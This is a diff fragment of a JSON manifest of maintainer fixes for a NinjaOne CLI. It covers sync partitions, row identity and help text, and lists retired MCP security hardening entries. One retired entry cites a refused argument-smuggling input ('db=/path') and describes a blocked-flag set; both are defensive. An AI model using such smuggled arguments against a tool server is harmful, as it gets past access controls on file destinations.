+   "summary": "A local or auto read of an endpoint reads the partition sync stores that endpoint under, and a write only writes through to the partition it can change.",
+   "why": "Press 4.34.0 named partitions by the alphabetically first endpoint, so local reads of several endpoints read another endpoint's rows.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/data_source.go",
+     "contains": "ninjaLocalPartition(resourceType, path)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/data_source.go",
+     "contains": "ninjaEndpointPartition(resourceType, path)",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/data_source.go",
+     "contains": "ninjaMutationMayWriteThrough(resourceType)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/ninja_endpoint_partition.go",
+     "contains": "func ninjaEndpointPartition(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "doctor-real-default-host",
+   "class": "doctor",
+   "status": "active",
+   "summary": "doctor treats only a real placeholder as unconfigured; the shipped default host app.ninjarmm.com is a real instance.",
+   "why": "doctor reported the default US instance as a placeholder.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "const doctorShippedBaseURL = \"\"",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "ninja-sync-partition-names",
+   "class": "local-store",
+   "status": "active",
+   "summary": "Five groups' primary sync partition stays on the endpoint the shipped release stored there (queries = /v2/queries/disks, backup = jobs, organization = documents, user = roles); antivirus-status syncs under queries-antivirus-status.",
+   "why": "Press 4.34.0 re-points each group to its alphabetically first endpoint, so an upgraded store would mix two endpoints' shapes in one partition and freeze queries-antivirus-status (av-sweep and fleet-health read it).",
+   "spec_encode_followup": "Pin partition names in the spec (x-resource-name) for the next print.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "\"queries-antivirus-status\":              \"/v2/queries/antivirus-status\",",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "\"queries\":                               \"/v2/queries/disks\",",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "\"backup\":                                \"/v2/backup/jobs\",",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "\"organization\":                          \"/v2/organization/documents\",",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "\"user\":                                  \"/v2/user/roles\",",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "not_contains": "\"queries-disks\""
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "not_contains": "\"backup-jobs\""
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "not_contains": "\"organization-documents\""
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "not_contains": "\"user-roles\""
+    }
+   ]
+  },
+  {
+   "id": "organization-documents-key",
+   "class": "local-store",
+   "status": "active",
+   "summary": "/v2/organization/documents rows are keyed on documentId (ClientDocumentWithAttributeValuesPublicApiDTO), not organizationId.",
+   "why": "Keyed on organizationId, every document of an organization collapsed into one stored row.",
+   "spec_encode_followup": "x-resource-id: documentId on /v2/organization/documents.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "\"organization\":                        \"documentId\",",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "\"organization\":                        \"documentId\",",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "sync-effective-page-size",
+   "class": "pagination",
+   "status": "active",
+   "summary": "sync judges a short page against the page size it actually requested (a user pageSize or limit), not the endpoint default.",
+   "why": "A requested page smaller than the default looked short and ended the walk after one page.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "pageSize.limit = syncRequestedPageLimit(params, pageSize)",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/ninja_sync_pagesize.go",
+     "contains": "func syncRequestedPageLimit(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "sync-param-defaults-include-bl",
+   "class": "local-store",
+   "status": "active",
+   "summary": "sync asks /v2/queries/volumes for include=bl so BitLocker status is stored for bitlocker-gaps.",
+   "why": "Without include=bl the volumes report omits bitLockerStatus and every volume read as NOT_REPORTED.",
+   "spec_encode_followup": "default: bl on the /v2/queries/volumes include parameter.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "func syncResourceParamDefaultsRendered(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/ninja_sync_params.go",
+     "contains": "package cli",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "dependent-parent-partition",
+   "class": "local-store",
+   "status": "active",
+   "summary": "Dependent resources read their parent ids from the partition the parent is actually synced under.",
+   "why": "After the partition-name pin the generated lookup read an empty partition and synced no dependents.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "dependentParentRows(db, ninjaDependentParentPartition(dep),",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/ninja_dependent_parent.go",
+     "contains": "func ninjaDependentParentPartition(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "backup-coverage-reads-documented-usage",
+   "class": "novel-correctness",
+   "status": "active",
+   "summary": "backup-coverage judges protection from the documented backup usage report fields.",
+   "why": "It read undocumented fields and reported protected devices as unprotected.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/novel_common.go",
+     "contains": "func backupUsageEvidence(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "report-row-identity",
+   "class": "report-row-identity",
+   "status": "active",
+   "summary": "A /v2/queries/* report row is keyed on its documented identity. Reports whose row schema has no per-item id (disks, antivirus-status, logged-on-users, processors, software, volumes, windows-services) are keyed on device id plus the row's ordinal among that device's rows in one walk (stamped _ninja_row_ordinal, counted across pages, walked from page one). Those position-keyed rows are written only by a walk that also replaces the whole report: the walk stages its stamped pages in a 0600 file beside the store and writes nothing while it walks; a walk that is complete, from page one, with only row-preserving parameters (one classifier, ninjaReportWalkParams: pageSize as a positive integer, include on /v2/queries/volumes), no since window or tenant scope, and only report-row pages replaces the partition in ONE transaction (store.ReplaceReportRows; shipped-key rows go too). Any other walk (capped, stuck, non-JSON or single-object page) writes nothing and reports reconcile_skipped + report_not_stored; a walk that fails on a page writes nothing and returns that resource's error. A row-narrowing parameter (any other, or unknown, key; a since window) on such a report is refused before any request, as a critical per-resource failure. --no-prune does not apply to them (a whole walk replaces them and says no_prune_not_applicable); workflow archive replaces them too. Every other report keeps the replace on every complete unfiltered walk unless --no-prune, judged by the same classifier; a filtered, resumed, capped or failed walk of one deletes nothing.",
+   "why": "Two same-named processors of one device collapsed into one row, and an ordinary sync kept a software version an upgrade replaced, so software-audit reported two installs where NinjaOne reports one. Codex r1 and the 2026-10-26 adversarial review then showed that any walk that wrote position-keyed rows without replacing the whole report (a documented filter such as installedAfter or state=STOPPED, pageSize misread as a filter, --max-pages, a failed later page, --no-prune) lost a row NinjaOne still returns or stored one twice.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "existingCursor = ninjaReportResumeCursor(resource, existingCursor)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "reportWalk := newNinjaReportWalk(resource, existingCursor)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "items = reportWalk.stamp(items)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "reportWalk.see(items)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "} else if ninjaSnapshotPartition(resource) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "res := syncResource(cmd.Context(), c, db, resource, sinceTS, full, maxPages, effectiveLatestOnly, prune, noPrune, userParams, syncEventWriter)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "not_contains": "} else if prune && ninjaSnapshotPartition(resource) {"
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "if key, ok := reportRowStorageID(resourceType, id, obj); ok {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "if ReportRowsAreOrdinal(resourceType) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "if err := s.dropLegacyResourceRowTx(tx, resourceType, storageID, obj); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "if s := resourceIDFallbackOverride(resourceType, obj); s != \"\" {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "\"queries-custom-fields-detailed\":        \"entityType\",",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/data_source.go",
+     "contains": "if !ninjaWriteThroughMayWrite(storedType) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/channel_workflow.go",
+     "contains": "res := syncResource(archiveCtx, c, s, resource, \"\", full, archiveMaxPages, false, false, ninjaArchiveNoPrune(resource), nil, syncEventWriter)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/ninja_report_row_identity_test.go",
+     "contains": "func TestIdenticalProcessorsOfOneDeviceStayTwoRows(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/ninja_report_row_identity_test.go",
+     "contains": "func TestOrdinarySyncReplacesAnUpgradedVersion(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/ninja_report_row_identity_test.go",
+     "contains": "func TestIncompleteReportWalkDeletesNothing(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/ninja_row_identity.go",
+     "contains": "func ReportRowsAreOrdinal(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "if refused, ok := ninjaRefuseNarrowedOrdinalWalk(resource, effectiveSince, userParams, syncEvents, started); ok {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "defer reportWalk.close()",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "if err := reportWalk.upsertSingleObject(db, data); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "stored, extractFailures, typedFailures, err := reportWalk.upsert(db, items)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "warn, err := reportWalk.reconcile(db, !noPrune, outcome.complete, outcome.reason, syncPruneSkipReason(resource, false, effectiveSince, \"\", userParams, reconcileMode, scopeKey), totalCount, syncEvents)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "userParams = ninjaReportPruneParams(resource, dependent, userParams)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "Does not apply to the reports whose rows have no id of their own (disks, antivirus status, logged-on users, processors, software, volumes, Windows services): a whole walk always replaces them, and any other walk stores none of its rows",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/ninja_report_params.go",
+     "contains": "func ninjaReportWalkParams(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/ninja_row_identity.go",
+     "contains": "func (s *Store) ReplaceReportRows(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/ninja_report_params_test.go",
+     "contains": "func TestReportWalkParamsClassifier(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/ninja_report_params_test.go",
+     "contains": "func TestFilteredOrdinalReportSyncIsRefused(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/ninja_report_params_test.go",
+     "contains": "func TestDocumentedFiltersOfOrdinalReportsAreRefused(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/ninja_report_params_test.go",
+     "contains": "func TestPageSizeOnlyOrdinalWalkReplacesTheReport(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/ninja_report_params_test.go",
+     "contains": "func TestIncompleteOrdinalWalkWritesNothing(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/ninja_report_params_test.go",
+     "contains": "func TestNoPruneDoesNotApplyToOrdinalReports(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/ninja_report_params_test.go",
+     "contains": "func TestArchiveReplacesAnOrdinalReport(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/ninja_report_replace_test.go",
+     "contains": "func TestReplaceReportRowsIsOneTransaction(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/ninja_report_replace_test.go",
+     "contains": "func TestReplaceReportRowsWritesWhatUpsertBatchWrites(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "not_contains": "stored, extractFailures, typedFailures, err := upsertResourceBatch(db, resource, items)"
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "not_contains": "} else if !noPrune && ninjaSnapshotPartition(resource) {"
+    }
+   ]
+  },
+  {
+   "id": "software-audit-description-matches-output",
+   "class": "docs",
+   "status": "active",
+   "summary": "The software-audit description in root help, which, and the MCP context says what the command outputs (install count, distinct-version count, version list), not where each version lives.",
+   "why": "The press renders the research description, which promised a per-version location the output does not carry.",
+   "spec_encode_followup": "Correct the novel's description in the research manuscript for the next print.",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "counts the installs and distinct versions across the fleet and lists the versions",
+     "min_count": 1,
+     "code_only": false
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "not_contains": "where each version lives"
+    },
+    {
+     "file": "cli/internal/cli/which.go",
+     "contains": "counts the installs and distinct versions across the fleet and lists the versions",
+     "min_count": 1,
+     "code_only": false
+    },
+    {
+     "file": "cli/internal/cli/which.go",
+     "not_contains": "where each version lives"
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "contains": "counts the installs and distinct versions across the fleet and lists the versions",
+     "min_count": 1,
+     "code_only": false
+    },
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "where each version lives"
+    }
+   ]
+  }
+ ],
+ "retired": [
+  {
+   "id": "env-oauth-secrets-not-persisted",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0 keeps the environment markers through SaveTokens and generates MarkCredentialsExplicit, so a client ID or secret read from the environment is never written by a token save."
+  },
+  {
+   "id": "mcp-filesystem-destination-gate",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0 builds a per-command blocked set (blockedDestinationFlags, blockedInputFlags, root control-plane flags), removes those flags from each tool's schema, refuses any undeclared argument name (so \"db=/path\" is refused) and skips '=' names in cliArgsFromMCP."
+  },
+  {
+   "id": "mcp-argv-value-joined",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #4647: every value-carrying branch of cliArgsFromMCP joins the value to its flag (--k=v, one element per list item), and the press generates TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag."
+  },
+  {
+   "id": "interim-http-security-note-2026-10-22",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: The note paused HTTP mode until a reprint because the build served HTTP with no token. Press 4.34.0 HTTP mode refuses to start without <PREFIX>_MCP_HTTP_TOKEN, answers 401 without the right bearer, binds 127.0.0.1 by default and refuses a non-loopback address without TLS; onboard.py now writes HTTP guidance that follows the binary (cc-skills #14) and never writes this note, so the entry would fail on every re-onboard."
+  },
+  {
+   "id": "mcp-file-flags-refused",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0's cobratree mirror derives one blocked set per command (destination, input, mcp:write-flags, mcp:read-flags and root control-plane flags), leaves those flags out of the tool schema and refuses them, and any undeclared argument, by name."
   }
  ]
 }
